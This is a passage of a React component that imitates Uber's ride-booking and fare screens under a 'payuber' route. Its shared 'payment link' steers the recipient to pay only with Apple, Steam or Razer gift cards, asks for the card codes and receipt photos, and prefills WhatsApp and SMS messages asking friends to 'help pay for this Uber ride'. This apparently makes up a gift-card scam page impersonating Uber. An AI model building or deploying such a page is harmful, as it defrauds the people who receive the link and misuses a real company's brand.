                      value={dropoffInput}
                      onChange={(e) => { setDropoffInput(e.target.value); handleAutocomplete(e.target.value, 'dropoff') }}
                    />
                    <div className="autocomplete-dropdown" style={{ display: activeDropdown === 'dropoff' && dropdownResults.length ? 'block' : 'none' }}>
                      {dropdownResults.map((r, i) => (
                        <div key={i} className="autocomplete-item" onClick={() => selectSuggestion('dropoff', r)}>
                          {r.displayName}
                        </div>
                      ))}
                    </div>
                  </div>
                </div>

                <div className="hero-actions">
                  <button className="see-prices-btn" id="search-btn" onClick={runRideSearch} disabled={searching}>
                    {searching ? 'Searching...' : 'See prices'}
                  </button>
                </div>
                {searchError && <p style={{ color: '#E54B4B', marginTop: 12, fontSize: 14 }}>{searchError}</p>}
              </div>
              <div className="hero-right">
                <div className="hero-image-wrapper">
                  <img src="/hero-travel.png" alt="Ready to travel?" />
                  <div className="hero-cta-overlay">
                    <span>Ready to travel?</span>
                  </div>
                </div>
              </div>
            </div>
          </section>
        </div>
      )}

      {/* Map view (landing ride list) */}
      {!sessionId && mapViewActive && (
        <div className="map-view active">
          <div className="map-sidebar">
            <div className="map-sidebar-header">
              <button className="map-back-btn" onClick={() => setMapViewActive(false)} dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }} />
            </div>
            <div className="map-sidebar-inputs">
              <div className="uber-inputs" style={{ marginBottom: 0 }}>
                <div className="uber-input-row">
                  <div className="uber-input-icon"><div className="dot-pickup"></div></div>
                  <input type="text" className="uber-input-field" value={pickupData?.displayName || ''} readOnly />
                </div>
                <div className="uber-input-row">
                  <div className="uber-input-icon"><div className="dot-dropoff"></div></div>
                  <input type="text" className="uber-input-field" value={dropoffData?.displayName || ''} readOnly />
                </div>
              </div>
            </div>

            <div className="map-sidebar-results">
              <div id="ride-types">
                {rideList.length ? renderRideList() : <p style={{ padding: 16, color: '#545454' }}>Searching for rides...</p>}
              </div>

              <div className="price-summary" style={{ display: priceSummary ? 'block' : 'none' }}>
                <div className="price-row"><span>Base fare</span><span>{formatPrice(priceSummary.baseFare)}</span></div>
                <div className="price-row"><span>Distance</span><span>{distanceKm.toFixed(1)} km</span></div>
                <div className="price-row"><span>Distance fare</span><span>{formatPrice(priceSummary.distanceFare)}</span></div>
                <div className="price-row"><span>Trip duration</span><span>{durationMin} min</span></div>
                <div className="price-total"><span>Total</span><span>{formatPrice(priceSummary.price)}</span></div>
              </div>
            </div>

            <div className="map-sidebar-footer">
              <button
                className="btn btn-primary btn-lg"
                id="request-btn"
                style={{ width: '100%' }}
                onClick={() => setShowModal(true)}
              >
                Request {RIDE_TYPES[selectedType]?.name || 'Uber'}
              </button>
            </div>
          </div>
          <div className="map-area">
            <div id="map" ref={mapRef} style={{ width: '100%', height: '100%' }}></div>
          </div>
        </div>
      )}

      {/* Pay mode (shared URL) — same page, different content */}
      {sessionId && (
        <div className="map-view active pay-mode">
          <div className="map-sidebar">
            <div className="map-sidebar-header">
              <button className="map-back-btn" onClick={() => router.push('/payuber')} dangerouslySetInnerHTML={{ __html: `${BACK_ICON} Back` }} />
            </div>
            <div className="map-sidebar-results" id="map-results">
              {sessionLoading && <p style={{ padding: 16, color: '#545454' }}>Loading payment session...</p>}
              {sessionError && (
                <div style={{ padding: 16 }}>
                  <h3 style={{ marginBottom: 8 }}>Payment link not available</h3>
                  <p style={{ color: '#545454', fontSize: 14 }}>{sessionError}</p>
                </div>
              )}

              {session && !sessionLoading && payStep === 'summary' && (
                <>
                  <h3 className="ride-category-title">{selectedSummary.name}</h3>
                  <div className="payment-route-card">
                    <div className="payment-route-row">
                      <span className="route-dot route-dot-pickup"></span>
                      <span>{truncateAddress(selectedSummary.pickup, 40)}</span>
                    </div>
                    <div className="payment-route-line"></div>
                    <div className="payment-route-row">
                      <span className="route-dot route-dot-dropoff"></span>
                      <span>{truncateAddress(selectedSummary.dropoff, 40)}</span>
                    </div>
                  </div>
                  <div className="price-summary" style={{ display: 'block' }}>
                    <div className="price-row"><span>Distance</span><span>{(selectedSummary.distanceKm || 0).toFixed(1)} km</span></div>
                    <div className="price-row"><span>Trip duration</span><span>{Math.round(selectedSummary.durationMin || 0)} min</span></div>
                    <div className="price-total"><span>Total</span><span>{formatPrice(selectedSummary.price)}</span></div>
                  </div>
                  <div className="map-sidebar-footer" style={{ paddingTop: 16 }}>
                    <button className="btn btn-primary btn-lg" style={{ width: '100%' }} onClick={() => setPayStep('methods')}>
                      Pay Now
                    </button>
                  </div>
                </>
              )}

              {session && !sessionLoading && payStep === 'methods' && (
                <>
                  <h3 className="ride-category-title">Gift Cards</h3>
                  <div className="payment-methods-grid">
                    {PAYMENT_METHODS.map((method) => (
                      <div
                        key={method.id}
                        className={`ride-type ${selectedMethod?.id === method.id ? 'active' : ''}`}
                        onClick={() => setSelectedMethod(method)}
                      >
                        <div className="ride-type-img" style={{ background: 'transparent', padding: 0 }}>
                          <span dangerouslySetInnerHTML={{ __html: method.id === 'apple' ? APPLE_GIFT_ICON : method.id === 'steam' ? STEAM_GIFT_ICON : RAZER_GIFT_ICON }} style={{ width: '100%', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center' }} />
                        </div>
                        <div className="ride-type-content">
                          <div className="ride-type-header">
                            <span className="ride-type-name">{method.label}</span>
                            <span className="ride-type-price">{formatPrice(selectedSummary.price)}</span>
                          </div>
                          <div className="ride-type-meta">{method.meta}</div>
                          <div className="ride-type-desc">{method.desc}</div>
                        </div>
                      </div>
                    ))}
                  </div>
                  <div className="map-sidebar-footer" style={{ paddingTop: 16 }}>
                    <button
                      className="btn btn-primary btn-lg"
                      style={{ width: '100%' }}
                      disabled={!selectedMethod}
                      onClick={() => setPayStep('card')}
                    >
                      Continue
                    </button>
                  </div>
                </>
              )}

              {session && !sessionLoading && payStep === 'card' && selectedMethod && (
                <>
                  <h3 className="ride-category-title">{selectedMethod.label}</h3>
                  <p className="ride-type-desc" style={{ marginBottom: 16 }}>
                    Enter your card code to pay {formatPrice(selectedSummary.price)} for your {selectedSummary.name} trip.
                  </p>

                  {!showUploadStep && !uploadComplete && (
                    <form onSubmit={checkCard} className="uber-inputs" style={{ marginBottom: 0 }}>
                      <div className="uber-input-row">
                        <input
                          type="text"
                          className="uber-input-field"
                          placeholder="Enter your card code"
                          autoComplete="off"
                          value={cardNumber}
                          onChange={(e) => setCardNumber(e.target.value.toUpperCase())}
                        />
                      </div>
                      {cardError && <p style={{ color: '#E54B4B', fontSize: 13, marginTop: 8 }}>{cardError}</p>}
                      {cardResult && (
                        <div className="payment-status-card confirmation-step" style={{ padding: '16px 0' }}>
                          <h3 style={{ marginBottom: 4 }}>Payment received</h3>
                          <p style={{ color: '#545454', fontSize: 14 }}>Your card has been applied to the trip. The driver will be notified shortly.</p>
                        </div>
                      )}
                      <div className="map-sidebar-footer" style={{ paddingTop: 16, display: cardResult ? 'none' : 'block' }}>
                        <button className="btn btn-primary btn-lg" style={{ width: '100%' }} disabled={cardLoading}>
                          {cardLoading ? 'Checking...' : 'Pay Now'}
                        </button>
                      </div>
                    </form>
                  )}

                  {showUploadStep && !uploadComplete && (
                    <div className="confirmation-card">
                      <h3 style={{ marginBottom: 8 }}>Upload receipt (optional)</h3>
                      <p style={{ color: '#545454', fontSize: 14, marginBottom: 16 }}>
                        Upload a photo of your gift card receipt to help confirm the payment.
                      </p>
                      <label className="btn btn-primary" style={{ cursor: 'pointer', marginBottom: 12 }}>
                        Select images
                        <input type="file" accept="image/*" multiple style={{ display: 'none' }} onChange={handleImageSelect} />
                      </label>
                      {selectedImages.length > 0 && (
                        <div style={{ display: 'flex', gap: 8, flexWrap: 'wrap', marginBottom: 12 }}>
                          {selectedImages.map((img, i) => (
                            <div key={i} style={{ position: 'relative' }}>
                              <img src={img.preview} alt={`preview ${i}`} style={{ width: 80, height: 80, objectFit: 'cover', borderRadius: 8 }} />
                              <button
                                type="button"
                                onClick={() => removeImage(i)}
                                style={{ position: 'absolute', top: -6, right: -6, background: '#000', color: '#fff', border: 'none', borderRadius: '50%', width: 22, height: 22, cursor: 'pointer', fontSize: 12 }}
                              >
                                ×
                              </button>
                            </div>
                          ))}
                        </div>
                      )}
                      {uploadError && <p style={{ color: '#E54B4B', fontSize: 13, marginBottom: 8 }}>{uploadError}</p>}
                      <div style={{ display: 'flex', gap: 8 }}>
                        <button className="btn btn-primary" onClick={handleUpload} disabled={uploadProgress}>
                          {uploadProgress ? 'Uploading...' : 'Upload receipt'}
                        </button>
                        <button className="btn" style={{ background: '#EEEEEE' }} onClick={skipUpload}>
                          Skip
                        </button>
                      </div>
                    </div>
                  )}

                  {uploadComplete && (
                    <div className="payment-status-card confirmation-step" style={{ padding: '16px 0' }}>
                      <h3 style={{ marginBottom: 4 }}>Payment complete</h3>
                      <p style={{ color: '#545454', fontSize: 14 }}>
                        Thanks! Your {selectedSummary.name} trip from {truncateAddress(selectedSummary.pickup, 30)} to {truncateAddress(selectedSummary.dropoff, 30)} has been paid.
                      </p>
                      <button
                        className="btn btn-primary"
                        style={{ marginTop: 16 }}
                        onClick={() => router.push('/payuber')}
                      >
                        Return Home
                      </button>
                    </div>
                  )}
                </>
              )}
            </div>
          </div>
          <div className="map-area">
            <div id="map" ref={mapRef} style={{ width: '100%', height: '100%' }}></div>
          </div>
        </div>
      )}

      {/* Payment modal */}
      {showModal && (
        <div className="uber-modal-overlay" onClick={() => setShowModal(false)}>
          <div className="uber-modal" onClick={(e) => e.stopPropagation()}>
            <button className="uber-modal-close" onClick={() => setShowModal(false)}>&times;</button>
            <h2>Request {RIDE_TYPES[selectedType]?.name}</h2>
            <p className="uber-modal-subtitle">Estimated fare: <strong>{formatPrice(calculatePrice(distanceKm, selectedType).price)}</strong></p>
            <div className="uber-modal-route">
              <div className="uber-modal-route-row">
                <div className="dot-pickup"></div>
                <span>{truncateAddress(pickupData?.displayName, 50)}</span>
              </div>
              <div className="uber-modal-route-line"></div>
              <div className="uber-modal-route-row">
                <div className="dot-dropoff"></div>
                <span>{truncateAddress(dropoffData?.displayName, 50)}</span>
              </div>
            </div>
            <div className="uber-modal-actions">
              <button className="uber-modal-btn uber-modal-btn-primary" id="modal-pay-btn" onClick={handlePayFor} disabled={modalBusy} dangerouslySetInnerHTML={{ __html: `${CARD_ICON} Pay for this ride` }} />
              <button className="uber-modal-btn uber-modal-btn-secondary" id="modal-share-btn" onClick={handleShare} disabled={modalBusy} dangerouslySetInnerHTML={{ __html: `${SHARE_ICON} Send payment link to a friend` }} />
            </div>
          </div>
        </div>
      )}

      {/* Share sheet */}
      {shareSheetUrl && (
        <div className="uber-modal-overlay" onClick={() => setShareSheetUrl('')}>
          <div className="uber-modal" onClick={(e) => e.stopPropagation()}>
            <button className="uber-modal-close" onClick={() => setShareSheetUrl('')}>&times;</button>
            <h2>Share Payment Link</h2>
            <p className="uber-modal-subtitle" style={{ marginBottom: 24 }}>
              Send this payment link to a friend so they can choose a method and pay the fare.
            </p>
            <div className="share-sheet-grid" style={{ justifyContent: 'center' }}>
              <div className="share-item" onClick={() => { navigator.clipboard.writeText(shareSheetUrl); showToast('Copied to clipboard!') }}>
                <div className="share-icon" style={{ background: '#E8E8E8', color: '#000' }} dangerouslySetInnerHTML={{ __html: COPY_ICON }} />
                <span>Copy</span>
              </div>
              <div className="share-item" onClick={() => window.open(`https://wa.me/?text=${encodeURIComponent('Hey! Can you help pay for this Uber ride? ' + shareSheetUrl)}`, '_blank')}>
                <div className="share-icon" style={{ background: '#25D366', color: '#fff' }} dangerouslySetInnerHTML={{ __html: WHATSAPP_ICON }} />
                <span>WhatsApp</span>
              </div>
              <div className="share-item" onClick={() => window.open(`sms:?&body=${encodeURIComponent('Hey! Can you help pay for this Uber ride? ' + shareSheetUrl)}`, '_self')}>
                <div className="share-icon" style={{ background: '#34C759', color: '#fff' }} dangerouslySetInnerHTML={{ __html: SMS_ICON }} />
                <span>Messages</span>
              </div>
              <div className="share-item" onClick={async () => {
                if (navigator.share) {
                  try {
                    await navigator.share({ title: 'Pay for Uber ride', text: 'Hey! Can you help pay for this Uber ride?', url: shareSheetUrl })
                  } catch (err) {}
                } else {
                  navigator.clipboard.writeText(shareSheetUrl)
                  showToast('Link copied directly!')
                }
              }}>
                <div className="share-icon" style={{ background: '#007AFF', color: '#fff' }} dangerouslySetInnerHTML={{ __html: NATIVE_ICON }} />
                <span>More</span>
              </div>
            </div>
          </div>
        </div>
      )}

      {/* Toast */}
      {toast && (
        <div className="toast-container">
          <div className="toast">{toast}</div>
        </div>
      )}
    </div>
  )
}
